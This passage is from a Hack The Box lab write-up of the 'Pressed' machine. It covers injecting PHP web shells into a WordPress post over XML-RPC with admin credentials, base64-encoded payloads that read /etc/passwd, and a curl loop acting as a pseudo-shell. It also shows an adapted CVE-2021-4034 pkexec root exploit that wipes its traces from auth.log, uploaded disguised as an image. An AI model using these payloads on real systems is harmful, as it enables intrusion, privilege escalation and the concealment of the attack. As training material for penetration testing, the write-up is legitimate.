style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">]) . &#34;&lt;/pre&gt;&#34;;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">?&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;?php system($_REQUEST[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">]); ?&gt;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> post_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> post <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>call(posts<span style="color:#f92672">.</span>GetPost(post_id))
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> new_content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;!-- wp:paragraph --&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;p&gt;The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.&lt;/p&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;!-- /wp:paragraph --&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;!-- wp:php-everywhere-block/php {&#34;code&#34;:&#34;JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGZXRjJTJGcGFzc3dkJykpJTNCJTIwJTNGJTNF&#34;,&#34;version&#34;:&#34;3.0.0&#34;} /--&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;!-- wp:paragraph --&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;p&gt;&lt;/p&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;!-- /wp:paragraph --&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;!-- wp:paragraph --&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;p&gt;&lt;/p&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;!-- /wp:paragraph --&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;?php system($_REQUEST[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">]); ?&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;?php system($_REQUEST[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">]); ?&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;?php</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">if(isset($_GET[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">])) {</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">    echo &#34;&lt;pre&gt;&#34; . shell_exec($_GET[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">]) . &#34;&lt;/pre&gt;&#34;;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">?&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;?php system($_REQUEST[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">]); ?&gt;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> post<span style="color:#f92672">.</span>content <span style="color:#f92672">=</span> new_content
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> client<span style="color:#f92672">.</span>call(posts<span style="color:#f92672">.</span>EditPost(post<span style="color:#f92672">.</span>id, post))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">True</span>
</span></span></code></pre></div><p>Now if we refresh the page, we can see the contents of <code>/etc/passwd</code>!
<img src="/images/Pressed/passwd.png" alt="Passwd"></p>
<p>Now let&rsquo;s add a web shell. First, we add our PHP code to the end of the echo statement. This is easy to do with <a href="https://gchq.github.io/CyberChef/">CyberChef</a>
<img src="/images/Pressed/chef.png" alt="Chef"></p>
<p>Then we do the same process we did previously</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> new_content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;!-- wp:paragraph --&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;p&gt;The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.&lt;/p&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;!-- /wp:paragraph --&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;!-- wp:php-everywhere-block/php {&#34;code&#34;:&#34;JTNDP3BocCUyMCUyMGVjaG8oZmlsZV9nZXRfY29udGVudHMoJy9ldGMvcGFzc3dkJykpOyUyMHN5c3RlbSgkX1JFUVVFU1QlNUInY21kJyU1RCk7JTIwPyUzRQ==&#34;,&#34;version&#34;:&#34;3.0.0&#34;} /--&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;!-- wp:paragraph --&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;p&gt;&lt;/p&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;!-- /wp:paragraph --&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;!-- wp:paragraph --&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;p&gt;&lt;/p&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;!-- /wp:paragraph --&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;?php system($_REQUEST[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">]); ?&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;?php system($_REQUEST[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">]); ?&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;?php</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">if(isset($_GET[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">])) {</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">    echo &#34;&lt;pre&gt;&#34; . shell_exec($_GET[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">]) . &#34;&lt;/pre&gt;&#34;;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">?&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;?php system($_REQUEST[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">]); ?&gt;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> post<span style="color:#f92672">.</span>content <span style="color:#f92672">=</span> new_content
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> client<span style="color:#f92672">.</span>call(posts<span style="color:#f92672">.</span>EditPost(post<span style="color:#f92672">.</span>id, post))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">True</span>
</span></span></code></pre></div><p>Finally, we can exploit our shell!
<img src="/images/Pressed/webshell.png" alt="Webshell"></p>
<p>Now, I tried to get a shell, but it just kept failing. I&rsquo;m not sure if it is possible, but I think I might just have to enumerate through the web shell. We can write a basic <code>bash</code> script to make this easier. I left the contents of <code>/etc/passwd</code> in the original payload which I&rsquo;m using as a point to find where the output of my commands will go</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>  read -p <span style="color:#e6db74">&#34;~: &#34;</span> user_input
</span></span><span style="display:flex;"><span>  curl -s http://pressed.htb/index.php/2022/01/28/hello-world/?cmd<span style="color:#f92672">=</span>$user_input | awk <span style="color:#e6db74">&#39;/:\/nonexistent:\/bin\/false/ {f=1; next} f &amp;&amp; /&lt;p&gt;&lt;\/p&gt;/ {exit} f {print}&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><p>Now we can run the script and it&rsquo;s kind of like a little shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$./auto.sh
</span></span><span style="display:flex;"><span>~: id
</span></span><span style="display:flex;"><span>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>~: whoami
</span></span><span style="display:flex;"><span>www-data
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>~: ifconfig
</span></span><span style="display:flex;"><span>ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
</span></span><span style="display:flex;"><span>        inet 10.10.11.142  netmask 255.255.254.0  broadcast 10.10.11.255
</span></span><span style="display:flex;"><span>        inet6 fe80::250:56ff:feb0:e101  prefixlen 64  scopeid 0x20&lt;link&gt;
</span></span><span style="display:flex;"><span>        ether 00:50:56:b0:e1:01  txqueuelen 1000  (Ethernet)
</span></span><span style="display:flex;"><span>        RX packets 10693  bytes 807963 (807.9 KB)
</span></span><span style="display:flex;"><span>        RX errors 0  dropped 103  overruns 0  frame 0
</span></span><span style="display:flex;"><span>        TX packets 1592  bytes 2216561 (2.2 MB)
</span></span><span style="display:flex;"><span>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
</span></span><span style="display:flex;"><span>        inet 127.0.0.1  netmask 255.0.0.0
</span></span><span style="display:flex;"><span>        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
</span></span><span style="display:flex;"><span>        loop  txqueuelen 1000  (Local Loopback)
</span></span><span style="display:flex;"><span>        RX packets 64965  bytes 4627241 (4.6 MB)
</span></span><span style="display:flex;"><span>        RX errors 0  dropped 0  overruns 0  frame 0
</span></span><span style="display:flex;"><span>        TX packets 64965  bytes 4627241 (4.6 MB)
</span></span><span style="display:flex;"><span>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>~:
</span></span></code></pre></div><p>My thought process here is:</p>
<ol>
<li>We don&rsquo;t have any interactive access so looking for privilege escalation paths like checking <code>sudo</code> permissions won&rsquo;t work since we can&rsquo;t enter our password when prompted</li>
<li>We either find cleartext credentials or we perform an exploit that just involves us running a command</li>
</ol>
<p>Looking around the machine we eventually stumble upon <code>pkexec</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>~: which+pkexec
</span></span><span style="display:flex;"><span>/usr/bin/pkexec
</span></span></code></pre></div><p>Immediately we should think of <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034">CVE-2021-4034</a> which is a memory corruption vulnerability. The PoC I usually uses spawns a root shell, but that won&rsquo;t work because we only have our web shell. We need a PoC that can simply run a command.  Eventually we stumble upon <a href="https://github.com/kimusan/pkwner/blob/main/pkwner.sh">this one</a>which we can modify to run a command instead of <code>/bin/bash</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>void gconv_init<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;hello&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>; setgid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>	seteuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>; setegid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;&#34;</span>
</span></span><span style="display:flex;"><span>         <span style="color:#e6db74">&#34;rm -rf &#39;GCONV_PATH=.&#39; &#39;pkwner&#39;;&#34;</span>
</span></span><span style="display:flex;"><span>         <span style="color:#e6db74">&#34;cat /var/log/auth.log|grep -v pkwner &gt;/tmp/al;cat /tmp/al &gt;/var/log/auth.log;&#34;</span>
</span></span><span style="display:flex;"><span>         <span style="color:#e6db74">&#34;cat /root/root.txt&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>	exit<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>EOM
</span></span></code></pre></div><p>Now we have to upload it. I tried converting it to base64 and creating a new file with the decoded output through the web shell, but it didn&rsquo;t work. Let&rsquo;s use <code>XML-RPC</code> since we remember seeing an upload file function in the docs</p>
<p>When trying to upload the exploit, which I named <code>exploit.sh</code>, we get an error saying this file type isn&rsquo;t allowed</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>SNIP<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> response <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>call(media<span style="color:#f92672">.</span>UploadFile(data))
</span></span><span style="display:flex;"><span>Traceback (most recent call last):
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;&lt;stdin&gt;&#34;</span>, line <span style="color:#ae81ff">1</span>, <span style="color:#f92672">in</span> <span style="color:#f92672">&lt;</span>module<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/home/jsmooth/CPTS_Prep/Pressed/pyWordpress/pywpress/lib/python3.9/site-packages/wordpress_xmlrpc/base.py&#34;</span>, line <span style="color:#ae81ff">37</span>, <span style="color:#f92672">in</span> call
</span></span><span style="display:flex;"><span>    raw_result <span style="color:#f92672">=</span> server_method(<span style="color:#f92672">*</span>args)
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/local/lib/python3.9/xmlrpc/client.py&#34;</span>, line <span style="color:#ae81ff">1122</span>, <span style="color:#f92672">in</span> __call__
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>__send(self<span style="color:#f92672">.</span>__name, args)
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/local/lib/python3.9/xmlrpc/client.py&#34;</span>, line <span style="color:#ae81ff">1464</span>, <span style="color:#f92672">in</span> __request
</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>__transport<span style="color:#f92672">.</span>request(
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/local/lib/python3.9/xmlrpc/client.py&#34;</span>, line <span style="color:#ae81ff">1166</span>, <span style="color:#f92672">in</span> request
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>single_request(host, handler, request_body, verbose)
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/local/lib/python3.9/xmlrpc/client.py&#34;</span>, line <span style="color:#ae81ff">1182</span>, <span style="color:#f92672">in</span> single_request
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>parse_response(resp)
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/local/lib/python3.9/xmlrpc/client.py&#34;</span>, line <span style="color:#ae81ff">1354</span>, <span style="color:#f92672">in</span> parse_response
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> u<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/usr/local/lib/python3.9/xmlrpc/client.py&#34;</span>, line <span style="color:#ae81ff">668</span>, <span style="color:#f92672">in</span> close
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> Fault(<span style="color:#f92672">**</span>self<span style="color:#f92672">.</span>_stack[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>xmlrpc<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>Fault: <span style="color:#f92672">&lt;</span>Fault <span style="color:#ae81ff">500</span>: <span style="color:#e6db74">&#39;Could not write file exploit.sh (Sorry, you are not allowed to upload this file type.).&#39;</span><span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>Let&rsquo;s change the file extension to <code>.jpeg</code> and see what happens</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> data <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;name&#39;</span>: <span style="color:#e6db74">&#39;exploit.jpeg&#39;</span>, <span style="color:#e6db74">&#39;type&#39;</span>: <span style="color:#e6db74">&#39;image/jpeg&#39;</span> }
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> client<span style="color:#f92672">.</span>call(media<span style="color:#f92672">.</span>UploadFile(data))
</span></span><span style="display:flex;"><span>{<span style="color:#e6db74">&#39;attachment_id&#39;</span>: <span style="color:#e6db74">&#39;55&#39;</span>, <span style="color:#e6db74">&#39;date_created_gmt&#39;</span>: <span style="color:#f92672">&lt;</span>DateTime <span style="color:#e6db74">&#39;20250316T04:29:54&#39;</span> at <span style="color:#ae81ff">0x7fa6007380a0</span><span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;parent&#39;</span>: <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;link&#39;</span>: <span style="color:#e6db74">&#39;/wp-content/uploads/2025/03/exploit.jpeg&#39;</span>, <span style="color:#e6db74">&#39;title&#39;</span>: <span style="color:#e6db74">&#39;exploit.jpeg&#39;</span>, <span style="color:#e6db74">&#39;caption&#39;</span>: <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;description&#39;</span>: <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;metadata&#39;</span>: <span style="color:#66d9ef">False</span>, <span style="color:#e6db74">&#39;type&#39;</span>: <span style="color:#e6db74">&#39;image/jpeg&#39;</span>, <span style="color:#e6db74">&#39;thumbnail&#39;</span>: <span style="color:#e6db74">&#39;/wp-content/uploads/2025/03/exploit.jpeg&#39;</span>, <span style="color:#e6db74">&#39;id&#39;</span>: <span style="color:#e6db74">&#39;55&#39;</span>, <span style="color:#e6db74">&#39;file&#39;</span>: <span style="color:#e6db74">&#39;exploit.jpeg&#39;</span>, <span style="color:#e6db74">&#39;url&#39;</span>: <span style="color:#e6db74">&#39;/wp-content/uploads/2025/03/exploit.jpeg&#39;</span>}
</span></span></code></pre></div><p>Success! The full code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#f92672">from</span> wordpress_xmlrpc.compat <span style="color:#f92672">import</span> xmlrpc_client
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#f92672">from</span> wordpress_xmlrpc.methods <span style="color:#f92672">import</span> media, posts
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> client <span style="color:#f92672">=</span> Client(<span style="color:#e6db74">&#39;http://pressed.htb/xmlrpc.php&#39;</span>, <span style="color:#e6db74">&#39;admin&#39;</span>, <span style="color:#e6db74">&#39;uhc-jan-finals-2022&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> file_path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/home/jsmooth/CPTS_Prep/Pressed/exploit.sh&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#66d9ef">with</span> open(file_path, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> img:
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>     data[<span style="color:#e6db74">&#39;bits&#39;</span>] <span style="color:#f92672">=</span> xmlrpc_client<span style="color:#f92672">.</span>Binary(img<span style="color:#f92672">.</span>read())
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> data <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;name&#39;</span>: <span style="color:#e6db74">&#39;exploit.png&#39;</span>, <span style="color:#e6db74">&#39;bits&#39;</span>: script, <span style="color:#e6db74">&#39;type&#39;</span>: <span style="color:#e6db74">&#39;text/plain&#39;</span> }
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> client<span style="color:#f92672">.</span>call(media<span style="color:#f92672">.</span>UploadFile(data))
</span></span><span style="display:flex;"><span>{<span style="color:#e6db74">&#39;attachment_id&#39;</span>: <span style="color:#e6db74">&#39;57&#39;</span>, <span style="color:#e6db74">&#39;date_created_gmt&#39;</span>: <span style="color:#f92672">&lt;</span>DateTime <span style="color:#e6db74">&#39;20250316T05:12:54&#39;</span> at <span style="color:#ae81ff">0x7fa600738370</span><span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#39;parent&#39;</span>: <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;link&#39;</span>: <span style="color:#e6db74">&#39;/wp-content/uploads/2025/03/exploit-1.png&#39;</span>, <span style="color:#e6db74">&#39;title&#39;</span>: <span style="color:#e6db74">&#39;exploit.png&#39;</span>, <span style="color:#e6db74">&#39;caption&#39;</span>: <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;description&#39;</span>: <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;metadata&#39;</span>: <span style="color:#66d9ef">False</span>, <span style="color:#e6db74">&#39;type&#39;</span>: <span style="color:#e6db74">&#39;text/plain&#39;</span>, <span style="color:#e6db74">&#39;thumbnail&#39;</span>: <span style="color:#e6db74">&#39;/wp-content/uploads/2025/03/exploit-1.png&#39;</span>, <span style="color:#e6db74">&#39;id&#39;</span>: <span style="color:#e6db74">&#39;57&#39;</span>, <span style="color:#e6db74">&#39;file&#39;</span>: <span style="color:#e6db74">&#39;exploit.png&#39;</span>, <span style="color:#e6db74">&#39;url&#39;</span>: <span style="color:#e6db74">&#39;/wp-content/uploads/2025/03/exploit-1.png&#39;</span>}
</span></span></code></pre></div><p>We can see the file path where it was uploaded. Now we just run it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>~: bash+/var/www/html/wp-content/uploads/2025/03/exploit-1.png
</span></span><span style="display:flex;"><span>âââââââ âââ  ââââââ    âââââââ   ââââââââââââââââââ
</span></span><span style="display:flex;"><span>âââââââââââ âââââââ    ââââââââ  âââââââââââââââââââ
</span></span><span style="display:flex;"><span>âââââââââââââââ âââ ââ âââââââââ âââââââââ  ââââââââ
</span></span><span style="display:flex;"><span>âââââââ âââââââ ââââââââââââââââââââââââââ  ââââââââ
</span></span><span style="display:flex;"><span>âââ     âââ  ââââââââââââââââ âââââââââââââââââ  âââ
</span></span><span style="display:flex;"><span>âââ     âââ  âââ ââââââââ âââ  ââââââââââââââââ  âââ
</span></span><span style="display:flex;"><span>CVE-2021-4034 PoC by Kim Schulz
</span></span><span style="display:flex;"><span>[+] Setting up environment&amp;#8230;
</span></span><span style="display:flex;"><span>[+] Build offensive gconv shared module&amp;#8230;
</span></span><span style="display:flex;"><span>[+] Build mini executor&amp;#8230;
</span></span><span style="display:flex;"><span>4bf2e3bae40305a69d25bb842ceab7f7
</span></span><span style="display:flex;"><span>hello[+] Nice Job
</span></span></code></pre></div><p>And we get the root flag!</p>

</content>
<p>
  
  <a href="https://jordangalida.github.io/blog/htb/">#HTB</a>
  
  <a href="https://jordangalida.github.io/blog/pentesting/">#Pentesting</a>
  
</p>

  </main>
  <footer>Made with <a href="https://github.com/janraasch/hugo-bearblog/">Hugo Êâ¢á´¥â¢Ê Bear</a>
</footer>

    
</body>

</html>
